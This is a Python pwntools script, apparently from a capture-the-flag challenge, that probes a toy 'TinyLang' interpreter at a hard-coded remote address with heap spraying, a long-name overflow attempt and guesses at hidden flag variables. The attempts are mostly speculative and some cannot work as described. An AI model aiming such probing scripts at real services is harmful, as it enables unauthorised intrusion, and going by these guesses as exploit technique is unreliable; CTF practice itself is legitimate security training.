#!/usr/bin/env python3
"""
TinyLang Flag Getter
Exploit heap overflow to read flag from memory
"""

from pwn import *

HOST = "212.2.248.184"
PORT = 31718

def exploit_heap_read():
    """Try to read flag from heap"""
    print("[*] Exploiting heap to read flag...")
    r = remote(HOST, PORT)
    r.recvline()
    addr_line = r.recvline().decode()
    addr = int(addr_line.split(": ")[1], 16)
    print(f"[*] Session at: {hex(addr)}")
    
    # Create variables and try to overflow
    r.sendline(b"let a = 1")
    r.sendline(b"let b = 2")
    r.sendline(b"let c = 3")
    
    # Try to read adjacent memory
    r.sendline(b"print a")
    print(f"[*] a: {r.recvline()}")
    r.sendline(b"print b")
    print(f"[*] b: {r.recvline()}")
    r.sendline(b"print c")
    print(f"[*] c: {r.recvline()}")
    
    # Create many variables to spray heap
    for i in range(50):
        r.sendline(f"let var{i} = {i}".encode())
    
    # Print them all to see if flag appears
    for i in range(50):
        r.sendline(f"print var{i}".encode())
        resp = r.recvline()
        if b"V15hw4CTF" in resp:
            print(f"[!!!] FLAG: {resp}")
            return
    
    r.close()

def try_overflow_to_flag():
    """Try to overflow into flag variable"""
    print("\n[*] Trying overflow to flag...")
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    # Maybe there's a hidden flag variable
    # Try to create variable that overflows into it
    r.sendline(b"let " + b"A" * 100 + b" = 1")
    r.sendline(b"print flag")
    resp = r.recvline()
    if b"V15hw4CTF" in resp:
        print(f"[!!!] FLAG: {resp}")
        return
    print(f"[*] print flag: {resp}")
    
    r.close()

def try_read_file():
    """Try to read flag file through memory"""
    print("\n[*] Trying to read flag file...")
    r = remote(HOST, PORT)
    r.recvline()
    r.recvline()
    
    # Try to set variable to file descriptor or path
    r.sendline(b"let file = 0")  # stdin
    r.sendline(b"print file")
    print(f"[*] file: {r.recvline()}")
    
    # Try different FDs
    for fd in [0, 1, 2, 3, 4, 5]:
        r.sendline(f"let fd{fd} = {fd}".encode())
        r.sendline(f"print fd{fd}".encode())
        resp = r.recvline()
        if b"V15hw4CTF" in resp:
            print(f"[!!!] FLAG at FD {fd}: {resp}")
            return
    
    r.close()

def main():
    print("=" * 60)
    print("TinyLang Flag Getter")
    print("=" * 60)
    
    exploit_heap_read()
    try_overflow_to_flag()
    try_read_file()
    
    # If nothing works, try interactive
    print("\n[*] Trying interactive mode...")
    r = remote(HOST, PORT)
    print(r.recvline().decode())
    print(r.recvline().decode())
    
    # Try some creative commands
    creative = [
        b"let __flag__ = 0",
        b"print __flag__",
        b"let _internal_flag = 0",
        b"print _internal_flag",
    ]
    
    for cmd in creative:
        r.sendline(cmd)
        resp = r.recvline()
        if b"V15hw4CTF" in resp:
            print(f"[!!!] FLAG: {resp}")
            break
        print(f"[*] {cmd}: {resp.decode().strip()}")
    
    r.close()

if __name__ == "__main__":
    main()
